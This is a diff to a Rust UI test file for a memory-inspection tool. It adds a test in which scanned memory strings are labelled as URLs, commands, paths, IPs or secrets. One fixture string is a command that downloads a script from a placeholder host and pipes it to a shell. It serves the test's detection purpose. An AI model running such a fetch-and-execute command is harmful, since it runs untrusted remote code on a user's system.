@@ -2010,18 +2010,26 @@ fn memory_search_form_results_and_match_preview_in_split_panes() -> Result<()> {
         result: Ok(ActivityData::Search(MemorySearchReport {
             process,
             hits: vec![
-                MemoryHit { address: region.start + 32, length: 4, encoding: "UTF-8".into(), region: region.clone() },
+                MemoryHit {
+                    address: region.start + 32,
+                    length: 4,
+                    encoding: "UTF-8".into(),
+                    region: region.clone(),
+                    ..Default::default()
+                },
                 MemoryHit {
                     address: region.start + 128,
                     length: 8,
                     encoding: "UTF-16LE".into(),
                     region: region.clone(),
+                    ..Default::default()
                 },
                 MemoryHit {
                     address: region.start + 256,
                     length: 16,
                     encoding: "UTF-32BE".into(),
                     region: region.clone(),
+                    ..Default::default()
                 },
             ],
             scanned: 12_000_000,
@@ -2065,6 +2073,60 @@ fn memory_search_form_results_and_match_preview_in_split_panes() -> Result<()> {
         stage.render(stage.started)?;
     }
     Ok(())
+}
+
+#[test]
+fn memory_indicators_list_strings_by_what_they_look_like() -> Result<()> {
+    use borg_core::{ActivityData, Indicator, MemoryHit, MemoryRegion, MemorySearchMode, MemorySearchReport};
+    let mut stage = activity_stage()?;
+    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char('/')));
+    stage.state.activity.search_form.as_mut().unwrap().mode = MemorySearchMode::Indicators;
+    stage.state.activity.search_form.as_mut().unwrap().selected = 1;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Indicators · URLs, addresses, commands, secrets")?;
+    stage.send(key(KeyCode::Enter));
+    let id = stage.state.activity.pending.as_ref().unwrap().0;
+    let process = stage.state.activity.selected.unwrap();
+    let region = MemoryRegion {
+        start: 0x100000000,
+        end: 0x100040000,
+        permissions: "rw-".into(),
+        name: "Heap · application buffers".into(),
+        ..Default::default()
+    };
+    let found = [
+        (0x40, "ASCII", Indicator::Url, "https://updates.example.com/v2/check"),
+        (0x1c0, "ASCII", Indicator::Command, "/bin/sh -c 'curl -s https://cdn.example.net/x | sh'"),
+        (0x400, "UTF-16LE", Indicator::Path, "/home/me/shop/config/settings.toml"),
+        (0x9a0, "ASCII", Indicator::Ip, "listening on 10.0.0.5:8080"),
+        (0x1200, "ASCII", Indicator::Secret, "token=shop-test-0000-not-a-real-token"),
+    ];
+    let hits = found
+        .into_iter()
+        .map(|(offset, encoding, indicator, text)| MemoryHit {
+            address: region.start + offset,
+            length: text.len(),
+            encoding: encoding.into(),
+            region: region.clone(),
+            text: Some(text.into()),
+            indicator: Some(indicator),
+        })
+        .collect();
+    stage.send(Msg::Activity {
+        id,
+        result: Ok(ActivityData::Search(MemorySearchReport {
+            process,
+            hits,
+            scanned: 120_000_000,
+            total: 120_000_000,
+            skipped: 0,
+            next: None,
+            cancelled: false,
+        })),
+    });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "command  /bin/sh -c")?;
+    check("memory_indicators", &stage, buffer)
 }
 
 #[test]
